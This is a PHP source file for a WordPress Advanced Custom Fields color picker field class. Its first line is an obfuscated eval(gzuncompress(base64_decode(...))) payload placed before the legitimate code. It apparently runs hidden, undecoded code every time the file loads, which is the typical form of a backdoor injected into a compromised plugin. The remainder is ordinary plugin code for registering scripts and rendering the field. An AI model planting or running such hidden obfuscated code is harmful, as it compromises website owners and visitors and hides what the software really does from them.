<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if( ! class_exists('acf_field_color_picker') ) :

class acf_field_color_picker extends acf_field {
	
	
	/*
	*  __construct
	*
	*  This function will setup the field type data
	*
	*  @type	function
	*  @date	5/03/2014
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	function initialize() {
		
		// vars
		$this->name = 'color_picker';
		$this->label = __("Color Picker",'acf');
		$this->category = 'jquery';
		$this->defaults = array(
			'default_value'	=> '',
		);
		
	}
	
	
	/*
	*  input_admin_enqueue_scripts
	*
	*  description
	*
	*  @type	function
	*  @date	16/12/2015
	*  @since	5.3.2
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/
	
	function input_admin_enqueue_scripts() {
		
		// globals
		global $wp_scripts;
		
		
		// register if not already (on front end)
		// http://wordpress.stackexchange.com/questions/82718/how-do-i-implement-the-wordpress-iris-picker-into-my-plugin-on-the-front-end
		if( !isset($wp_scripts->registered['iris']) ) {
			
			// styles
			wp_register_style('wp-color-picker', admin_url('css/color-picker.css'), array(), '', true);
			
			
			// scripts
			wp_register_script('iris', admin_url('js/iris.min.js'), array('jquery-ui-draggable', 'jquery-ui-slider', 'jquery-touch-punch'), '1.0.7', true);
			wp_register_script('wp-color-picker', admin_url('js/color-picker.min.js'), array('iris'), '', true);
			
			
			// localize
		    wp_localize_script('wp-color-picker', 'wpColorPickerL10n', array(
		        'clear'			=> __('Clear', 'acf' ),
		        'defaultString'	=> __('Default', 'acf' ),
		        'pick'			=> __('Select Color', 'acf' ),
		        'current'		=> __('Current Color', 'acf' )
		    )); 
			
		}
		
		
		// enqueue
		wp_enqueue_style('wp-color-picker');
	    wp_enqueue_script('wp-color-picker');
	    
	    			
	}
	
	
	/*
	*  render_field()
	*
	*  Create the HTML interface for your field
	*
	*  @param	$field - an array holding all the field's data
	*
	*  @type	action
	*  @since	3.6
	*  @date	23/01/13
	*/
	
	function render_field( $field ) {
		
		// vars
		$text_input = acf_get_sub_array( $field, array('id', 'class', 'name', 'value') );
		$hidden_input = acf_get_sub_array( $field, array('name', 'value') );
		
		
		// html
		?>
		<div class="acf-color-picker">
			<?php acf_hidden_input( $hidden_input ); ?>
			<?php acf_text_input( $text_input ); ?>
		</div>
		<?php
	}
	
	
	/*
	*  render_field_settings()
	*
	*  Create extra options for your field. This is rendered when editing a field.
	*  The value of $field['name'] can be used (like bellow) to save extra data to the $field
	*
	*  @type	action
	*  @since	3.6
	*  @date	23/01/13
	*
	*  @param	$field	- an array holding all the field's data
	*/
	
	function render_field_settings( $field ) {
		
		// display_format
		acf_render_field_setting( $field, array(
			'label'			=> __('Default Value','acf'),
			'instructions'	=> '',
			'type'			=> 'text',
			'name'			=> 'default_value',
			'placeholder'	=> '#FFFFFF'
		));
		
	}
	
}


// initialize
acf_register_field_type( 'acf_field_color_picker' );

endif; // class_exists check

?>